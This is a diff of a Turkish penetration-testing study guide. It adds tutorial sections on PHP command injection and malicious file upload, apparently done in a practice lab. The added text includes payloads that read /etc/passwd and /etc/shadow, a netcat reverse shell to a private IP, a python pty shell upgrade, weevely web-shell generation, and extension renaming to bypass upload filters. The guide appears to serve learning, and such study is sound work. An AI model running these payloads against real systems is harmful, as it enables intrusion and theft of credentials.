@@ -26,13 +26,13 @@
   - [Dirbuster](#Dirbuster)
   - [iFrame Injection](#iFrame-Injection)
 - [PHP Açıkları](#PHP-Açıkları)
-	-[PHP Code Injection](#PHP-Code-Injection)	 
-	-[PHP Upload Injection](#PHP-Upload-Injection)
+  - [PHP Code Injection](#PHP-Code-Injection)	 
+  - [PHP Upload Injection](#PHP-Upload-Injection)
 - [Foxy Proxy](#Foxy-Proxy)
 - [Kod Çalıştırma & SSI](#Kod-Çalıştırma-&-SSI)
-	-[Os Command Injection](#Os-Command-Injection)
-	-[Commix](#Commix)
-	-[SSI Injection](#SSI-Injection)
+  - [Os Command Injection](#Os-Command-Injection)
+  - [Commix](#Commix)
+  - [SSI Injection](#SSI-Injection)
 
 # IP Çeşitleri
 > ## Public IP 
@@ -268,5 +268,42 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 > ## PHP Code Injection
 
 - Dosya upload ederek yararlanılan zaafiyetlerdir
-- PHP açıklarında ````burpsuite``` kullanılabileceği gibi kullanılmayadabilir
-- 
+- PHP açıklarında ```burpsuite``` kullanılabilir, eğer parametre linkte varsa ```burpsuite``` kullanmaya gerek yok
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.01.34.jpeg)
+- Parametreler linkte yoksa ```burpsuite``` içinde ```intercept is on``` yapıyoruz ve yakaladığmız ```GET``` dosyası içinde değişiklik yapıyoruz
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.02.36.jpeg)
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.03.08.jpeg)
+- ```...?message=hello;system("whoami")``` deniyoruz. ";" işareti aynı anda 2 komut çalıştırmamızı sağlar
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.09.37.jpeg)
+- ```...?message=hello;system("cat /etc/passwd")``` ve ```...?message=hello;system("cat /etc/shadow")``` deniyoruz, bu kod ile sistem şifrelerini görebiliriz
+
+! cat /etc/passwd ve cat /etc/shadow içerisinde kriptolanmış kali şifrelerini görebiliriz.
+
+- ```Natcat``` kullanarak dinleme yapabileceğimiz gibi portlara bilgide yollayabiliriz
+- ```nc -nvlp 1234``` ile dinlemeyi başlatıyoruz
+- ```...?message=test;system("nc 192.168.123.123 1234 -e /bin/bash")``` çalıştırıyoruz işe yaramazsa ```-e /bin/sh``` deneyebiliriz
+- Terminal'i kullanarak site içerisinde gezinebiliriz
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.18.38.jpeg)
+- Sunucuda bir python kodu çalıştırabiliyorsak kendimiz bir shell açabiliriz
+- Terminal üzerinden site sunucusundayken ```python -c import pty; pty.spawn("/bin/bash")``` yazıyoruz ve shell açmayı deniyoruz
+
+> ## PHP Upload Injection (low level)
+
+- Görsel yükleyebildiğimiz sitelerde yararlanılan bir zaafiyettir
+- Site içerisine ```.php``` dosyası yüklemeyi deneriz
+- ```.php``` dosyası hazırlarken ```weevely``` kullanırız
+
+```
+weevely generate <password><dosya ismi> -> .php dosyası oluşturur
+weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanarak shell içine girmemizi sağlar
+```
+- Eğer site içerisinde dosyanın yüklendiği konum görünmüyorsa ```burpsuite``` açıp ```response``` kısmından bulabiliriz
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.47.45.jpeg)
+- Artık sunucu içine giriş yaptık, sunucu içinde komutlarla (ls,pwd vb) dolaşabiliriz
+
+> ## PHP Upload Injection (medium level)
+
+- Bazı siteler bazı uzantıları engellemiş olabilir
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.52.17.jpeg)
+- O zaman ```.php``` dosyamızın bulunduğu konuma gideriz ```cp myphp.php myphp.php3``` kodu ile dosyayı farklı isimle kopyalarız, Çalışmazsa ```.php4 veya .php5``` deneyebiliriz
